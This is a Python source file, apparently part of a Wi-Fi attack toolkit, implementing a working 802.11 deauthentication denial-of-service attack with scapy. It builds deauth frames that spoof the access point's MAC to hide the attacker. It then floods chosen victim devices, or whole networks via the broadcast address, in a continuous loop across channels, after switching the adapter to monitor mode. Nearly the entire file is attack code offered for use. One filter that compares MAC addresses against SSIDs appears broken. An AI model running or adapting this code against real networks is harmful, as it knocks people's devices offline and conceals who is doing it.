import time

from threading import Thread, Event
from typing import MutableSet, Optional

from scapy.packet import Packet
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.sendrecv import sendp

from WiFiFunctions.black_list_manager import BlackListManager
from utility import change_channel_from_shell
from GUI.gui_manager import GUIManager
from Core.access_point import AccessPoint
from WiFiFunctions.wireless_utility import (change_known_ssids_autoconnection_state,
                                            is_wireless_adapter_connected, check_and_set_wifi_adapter_mode,
                                            WirelessAdapterModeEnum, disconnect_wireless_adapter, get_known_ssids,
                                            BROADCAST_MAC)


class WiFiDeauthenticator:
    """
    The WiFiDeauthenticator class to handle the scan of access points and the de-authentication attack
    of a single device or an entire Wi-Fi network.
    """

    def __init__(self, wireless_adapter_key: str, access_point_set: MutableSet[AccessPoint]):
        """
        Initializes the WiFiDeAuth object.
        :param wireless_adapter_key: The key of the wireless interface (e.g. "wlan0")
        :raises FileNotFoundError: If the settings file is not found
        """

        self._wireless_adapter_key: str = wireless_adapter_key
        self._access_points_set: MutableSet[AccessPoint] = access_point_set

        # The BlackListManager object to handle the access points in the blacklist
        self._blacklist_manager: BlackListManager = BlackListManager()

        # Used to handle thread termination
        self._end_thread_event: Event = Event()

    def start_dos_attack(self, ap_ssid_target_set: set[str], victim_mac_set: set[str],
                         attack_log_info: Optional[str] = None):
        """
        Start the de-authentication attack, for every access points in the given set, towards the victim device.
        :param ap_ssid_target_set: The set of SSIDs of the access points to attack
        :param victim_mac_set: The set of MAC addresses of the victim devices
        :param attack_log_info: The information to show, about the targets, before starting the attack
        """

        # Get the set of the known SSIDs from the system
        known_ssid_set: set[str] = get_known_ssids()

        # Filter the SSIDs in the set, keeping only the known ones
        selected_known_ssid_set = ap_ssid_target_set.intersection(known_ssid_set)

        # Create a thread to handle the de-authentication attack
        deauth_thread = Thread(target=self._dos_attack_loop,
                               args=(ap_ssid_target_set, victim_mac_set),
                               daemon=True)

        try:
            # If the de-authentication attack may harm the attacking machine,
            # put the target Access Points in blacklist
            if BROADCAST_MAC in victim_mac_set:
                target_access_point_mac_set: set[str] = {ap.mac for ap in self._access_points_set
                                                          if ap.mac in ap_ssid_target_set}
                self._blacklist_manager.add_to_blacklist(*target_access_point_mac_set)

            # If the Wi-Fi adapter is connected to any of the target access points, disconnect it.
            # This is done in order to not interfere with the attack itself.
            if len(selected_known_ssid_set) > 0:
                # Disable the autoconnection for the SSIDs in the set
                change_known_ssids_autoconnection_state(known_ssid_set=selected_known_ssid_set,
                                                        autoconnection_state=False)

                # Disconnect the Wi-Fi adapter if it is connected to one of the access points in the set
                if is_wireless_adapter_connected(self._wireless_adapter_key, selected_known_ssid_set):
                    disconnect_wireless_adapter(wireless_adapter_key=self._wireless_adapter_key,
                                                verbose=True)

            # Before sending the packets, set the Wi-Fi adapter in monitor mode if it's not
            check_and_set_wifi_adapter_mode(wireless_adapter_key=self._wireless_adapter_key,
                                            mode=WirelessAdapterModeEnum.MONITOR,
                                            verbose=True)

            # Start the DOS attack for each access point, with a dedicated thread,
            # and run it until the user presses CTRL+C
            deauth_thread.start()

            while True:
                try:
                    GUIManager().clear_screen()
                    if attack_log_info is not None and attack_log_info != "":
                        GUIManager().print(f"{attack_log_info}\n")

                    GUIManager().print("De-authentication attack started.\n"
                                       "Press Ctrl+C to stop the attack...\n")

                    time.sleep(1)
                except KeyboardInterrupt:
                    GUIManager().print("\nDe-authentication attack stopped.\n")
                    break

        except KeyboardInterrupt:
            pass

        finally:
            # Turn the thread flag to true, wait for it to end and clear the flag
            if deauth_thread.is_alive():
                self._end_thread_event.set()
                deauth_thread.join()
                self._end_thread_event.clear()

            # Before ending the functionality, put the wireless adapter in managed mode if it's not
            check_and_set_wifi_adapter_mode(wireless_adapter_key=self._wireless_adapter_key,
                                            mode=WirelessAdapterModeEnum.MANAGED,
                                            verbose=True)

            # Enable again the autoconnection for the SSIDs in the set
            if len(selected_known_ssid_set) > 0:
                change_known_ssids_autoconnection_state(known_ssid_set=selected_known_ssid_set,
                                                        autoconnection_state=True)

            # Clear the blacklist inside the BlackListManager object
            self._blacklist_manager.clear_blacklist()

    def _dos_attack_loop(self, ap_ssid_target_set: set[str], victim_mac_set: set[str]):
        """
        Start the de-authentication attack, for every access points in the given set, towards the victim device.
        :param ap_ssid_target_set: The set of SSIDs of the access points to attack
        :param victim_mac_set: The set of MAC addresses of the victim devices
        """

        # Get all the access points, among the scanned ones, with the SSIDs in the set
        target_access_point_list: list[AccessPoint] = list(filter(lambda ap: ap.ssid in ap_ssid_target_set,
                                                                  self._access_points_set))

        # The sendp function allows to send a list of packets using the same channel.
        # Thus, the deauth packets to send are created and grouped by channel,
        # since, for the attack, it is required to change the channel
        # before sending the packets
        packet_list_by_channel_dict: dict[int, list[Packet]] = {}
        for access_point in target_access_point_list:
            # Create a de-authentication packet for each victim device
            packet_list: list[Packet] = [self._create_deauth_packet(access_point_mac=access_point.mac,
                                                                    victim_mac=victim_mac)
                                         for victim_mac in victim_mac_set]

            # Create a list of packets for each channel, if it doesn't exist, and add the packets to the list
            if access_point.channel not in packet_list_by_channel_dict.keys():
                packet_list_by_channel_dict[access_point.channel] = []

            packet_list_by_channel_dict[access_point.channel].extend(packet_list)

        # Perform the attack until the end_thread_event is set
        while not self._end_thread_event.is_set():
            for channel, packet_list in packet_list_by_channel_dict.items():
                self._send_packets(packet_list=packet_list, channel=channel)

    def _send_packets(self, packet_list: list[Packet], channel: int, inter: float = 0.01, count: int = 30):
        """
        Send the packets at level 2, using the given channel. If a lock is given, it's used to synchronize the access
        to the shell command to change the channel.
        :param packet_list: The list of packets to send
        :param channel: The channel to use for the attack
        :param inter: The time in seconds between each packet sent
        :param count: The number of packets to send for each loop
        """

        # Before sending the packets, set the Wi-Fi adapter in monitor mode if it's not
        check_and_set_wifi_adapter_mode(wireless_adapter_key=self._wireless_adapter_key,
                                        mode=WirelessAdapterModeEnum.MONITOR,
                                        verbose=True)

        try:
            # Change the channel to the given one
            change_channel_from_shell(wireless_interface_key=self._wireless_adapter_key, channel=channel)

            # Send the packets (the duration in seconds for one sendp is inter * count * loop seconds)
            #   inter: time between each packet sent
            #   count: number of packets to send (None means infinite)
            #   loop: number of times to loop the packet list (0 means infinite)
            #   iface: wireless interface to use
            sendp(x=packet_list, inter=inter, count=count, loop=1,
                  iface=self._wireless_adapter_key, return_packets=False, verbose=False)
        except:
            pass

    @classmethod
    def _create_deauth_packet(cls, access_point_mac: str, victim_mac: str, reason: int = 4) -> Packet:
        """
        Create the 802.11 frame to send for the de-authentication attack.
        :param access_point_mac: The MAC address of the access point to attack
        :param victim_mac: The MAC address of the victim
        :param reason: The reason for the de-authentication (default is 4, which means "Disassociated due to inactivity")
        :return: The 802.11 frame to send
        """

        # addr1: destination MAC (the victim device to attack)
        # addr2: source MAC (the source of the packet.
        #        Using the access point MAC is done in order to hide the attacker's MAC address)
        # addr3: BSSID (the access point MAC, used to send the packet to the right access point)
        return RadioTap() / Dot11(addr1=victim_mac,
                                  addr2=access_point_mac,
                                  addr3=access_point_mac) / Dot11Deauth(reason=reason)
